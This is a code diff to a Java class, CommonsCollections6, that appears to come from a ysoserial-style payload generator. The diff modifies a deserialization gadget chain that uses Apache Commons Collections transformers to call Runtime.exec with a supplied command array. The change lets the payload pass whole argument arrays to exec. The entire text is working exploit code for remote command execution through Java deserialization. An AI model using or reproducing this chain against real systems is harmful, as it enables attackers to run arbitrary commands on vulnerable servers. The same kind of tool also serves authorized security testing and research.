@@ -38,8 +38,6 @@ import java.util.Map;
 public class CommonsCollections6 extends ExtendedObjectPayload<Serializable> {
 
     public Serializable getObject(final String[] command) throws Exception {
-        final String[] execArgs = command.clone();
-
         final Transformer[] transformers = new Transformer[] {
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[] {
@@ -49,7 +47,7 @@ public class CommonsCollections6 extends ExtendedObjectPayload<Serializable> {
                         Object.class, Object[].class }, new Object[] {
                         null, new Object[0] }),
                 new InvokerTransformer("exec",
-                        new Class[] { String.class }, execArgs),
+                        new Class[] { String[].class }, new Object[] { command }),
                 new ConstantTransformer(1) };
 
         Transformer transformerChain = new ChainedTransformer(transformers);
